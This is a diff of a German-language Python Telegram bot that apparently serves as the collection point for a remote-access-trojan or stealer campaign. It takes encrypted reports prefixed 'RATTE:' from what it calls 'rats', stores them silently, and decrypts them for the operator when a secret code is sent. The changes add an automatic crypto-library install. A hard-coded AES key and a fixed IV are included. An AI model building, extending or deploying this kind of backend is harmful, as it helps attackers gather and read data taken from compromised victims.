@@ -1,13 +1,28 @@
-import subprocess
-import sys
+# ENI & LO – Der 67-Bot (mit automatischer Crypto-Installation)
 
+import os
+import sys
+import subprocess
+
+# ============================================================
+# CRYPTO INSTALLIEREN – BEVOR ETWAS ANDERES IMPORTIERT WIRD
+# ============================================================
 try:
     from Crypto.Cipher import AES
 except ImportError:
     print("⚠️ Crypto nicht gefunden. Installiere...")
     subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome==3.20.0"])
-    print("✅ Installation abgeschlossen. Starte neu...")
+    print("✅ Crypto installiert. Starte Bot neu...")
     os.execv(sys.executable, ['python'] + sys.argv)
+
+# ============================================================
+# JETZT ALLE ANDEREN IMPORTS
+# ============================================================
+import json
+import base64
+from datetime import datetime
+from telegram import Update
+from telegram.ext import Application, MessageHandler, filters, CallbackContext
 
 # ============================================================
 # KONFIGURATION
@@ -17,10 +32,7 @@ SECRET_CODE = "!67?"
 DATA_FILE = "ratten_daten.json"
 LAST_UPDATE_FILE = "last_update.txt"
 
-# DEINE CHAT-ID
-MY_CHAT_ID = "8583803376"
-
-# DER GEHEIME SCHLÜSSEL
+# DER GEHEIME SCHLÜSSEL – NUR DU KENNST IHN
 SECRET_KEY = "ENI_LO_SECRET_2026_ULTRA"
 IV = "1234567890123456"
 
@@ -64,10 +76,9 @@ def save_last_update(timestamp):
 # ============================================================
 async def handle_message(update: Update, context: CallbackContext):
     user_message = update.message.text
-    chat_id = str(update.message.chat_id)
 
     # ============================================================
-    # 1. GEHEIMER CODE – !67? (NUR HIER WERDEN DATEN GEZEIGT)
+    # 1. GEHEIMER CODE – !67?
     # ============================================================
     if user_message == SECRET_CODE:
         data = load_data()
@@ -95,7 +106,7 @@ async def handle_message(update: Update, context: CallbackContext):
             await update.message.reply_text("📭 Keine neuen Daten seit deinem letzten Abruf.")
             return
 
-        response = "🐀 *ENI & LO – Neue Daten*\n\n"
+        response = "🐀 *ENI & LO – Neue Daten (entschlüsselt)*\n\n"
         for entry in new_entries:
             ratte_id = entry["ratte_id"]
             encrypted_data = entry["data"]
@@ -135,7 +146,7 @@ async def handle_message(update: Update, context: CallbackContext):
         return
 
     # ============================================================
-    # 2. DATEN VON RATTEN – NUR SPEICHERN, NIE ANZEIGEN
+    # 2. DATEN VON RATTEN SPEICHERN
     # ============================================================
     if user_message.startswith("RATTE:"):
         try:
@@ -157,7 +168,6 @@ async def handle_message(update: Update, context: CallbackContext):
                 })
                 save_data(all_data)
 
-                # NUR "67" – KEINE DATEN ANZEIGEN
                 await update.message.reply_text("67")
                 return
         except Exception as e:
@@ -172,7 +182,7 @@ async def handle_message(update: Update, context: CallbackContext):
 # MAIN
 # ============================================================
 def main():
-    print("🐀 ENI & LO – Der 67-Bot (NUR auf Befehl – GARANTIERT)")
+    print("🐀 ENI & LO – Der 67-Bot (mit Crypto-Installation)")
     print("=" * 50)
     print(f"Bot Token: {BOT_TOKEN[:10]}...")
     print(f"Geheimer Code: {SECRET_CODE}")
